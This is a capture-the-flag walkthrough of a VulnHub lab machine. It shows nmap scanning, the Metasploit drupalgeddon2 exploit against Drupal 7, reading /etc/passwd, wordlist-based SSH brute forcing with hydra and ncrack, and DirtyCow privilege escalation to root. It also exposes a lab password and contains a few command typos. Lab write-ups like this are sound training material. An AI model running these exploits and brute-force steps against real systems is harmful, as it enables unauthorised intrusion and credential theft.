# White Christmas Walkthrough

 - by Igor Loza

This walkthrough is for a modified version of https://www.vulnhub.com/series/lampiao,169/ machine titled White Christmas. 

## 1. Identify Machines and open ports
To start, you need to identify the IP of the machine, the best and easiest way to launch the machine in bridged mode, run a nmap and scan the ports.

### a. Get subnet size
```sh
ip -a
```
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/1a.png)

### b. Get IP of machine target machine 
```sh
nmap -sn 192.168.80.128/24
```
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/1b.png)

###	c. Now that you know the IP, scan for open ports
```sh
nmap -Pn -sV -A -o- -v 102.168.80.131 > nmapscan.txt
vim nmapscan.txt
```
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/1c.png)
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/1c-2.png)

### d. From the above you can see that there are 3 open ports, 22 (ssh), 80 (html), 1898 (html) 
- 22 (ssh) by itself is not that helpful
- Port 80 returned no results (might be a dead end)
- Port 1898 looks very exposed, highest chance of being vulnerable.
-- Note version of Apache/Ubuntu

### e. Test port 80 just in case, looks like the connection gets closed after the content is presented.
```sh
telnet 192.168.80.131 80
```
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/1e-1.png)
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/1e-2.png)
See what information is available on the website(s), note the usernames, might be useful
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/1e-3.png)
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/1e-4.png)

## 2.	Using the Drupal 7 vulnerability, see what you can get with metasploit

### a. After searching drupal7 you can find a know vulnerability drupalgeddon2
```sh
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOST 192.168.80.131
set RPORT 1898
exploit
```
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/2a.png)

### b. Get the OS level to see if there are any easy wins
```sh
shell
/bin/bash -i
unam -a
```
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/2b.png)

### c. Identify the list of users on the machine, not the overlap between website in section 1.e and list of users. Maybe the user was silly enough to publish his/her password on the website itself – come back to this later
```sh
cat \etc\passwd
```
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/2c.png)

### d. Now that you know that the OS is 4.4.0-31, find the best available vulnerabilities. I suggest using linux-exploit-suggester.sh as an easy way to list most likely exploits.
 - i. Download file from the internet onto your Kali machine
```sh
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
```
 - ii. Copy the file onto the machine and test run it using meterpeter (exit from shell first) and identify exploits
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/2d.png)
 - iii.	Try the exploit, I chose dirtycow2 based on its description
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/2d-2.png)
- iv.	Download the 40847.cpp exploit as per ext-url above and use meterpeter to get it onto your vm as per 2.ii above
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/2d-3.png)
 - v.	Follow the instructions on the exploit page: https://www.exploit-db.com/exploits/40847 to attempt the exploit.
```sh
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
./dcow -s
```
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/2d-4.png)
 - vi.	As per above, looks like you need a legit shell, and not a reverse shell. Maybe you can use the username above in 2.c (tiago) and crack the password.

## 3.	Get proper shell for tiago

### a.	See if you can use some code text from the website to generate a password list for tiago using cewl
```sh
cewl -w cewl.txt http://192.168.80.131:1898/?q=node/1
```
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/3a.png)

### b.	Now see if you can get onto the machine using hydra and the tiago username/cewl.txt wordlist. 
```sh
echo tiago > userlist.txt
hydra -L userlist.txt -P cewl.txt -f -e nsr -o hydra.txt -t 4 ssh://192.168.80.131
```
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/3b.png)
Looks like hydra is broken or doesn’t work for this machine 

### c.	Lets try nrack
```sh
ncrack -v --user tiago -P cewl.txt 192.168.80.131:22
```
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/3c.png)
Note username: tiago, password: showrunner

### d.	Now that we have the username and password, lets ssh to the machine 
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/3d.png)

## 4.	Now that we have proper root, lets try the dirtycow2 exploit we were trying earlier
```sh
cd /tmp
./dcow -s
```
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/4.png)

## 5.	Now that we have root, we need to find flag! Conveniently the flag is found in the root directory: /root
![Images Missing](https://raw.githubusercontent.com/igorloza/pentest-walkthrough/master/whitechristmas/images/5.png)

Thank you for reading my walkthrough of White Christmas VM formally known as lampio.
For further reading please refer to:
Online walkthrough https://hackso.me/lampiao-1-walkthrough/ 
Original VM: https://www.vulnhub.com/series/lampiao,169/ 


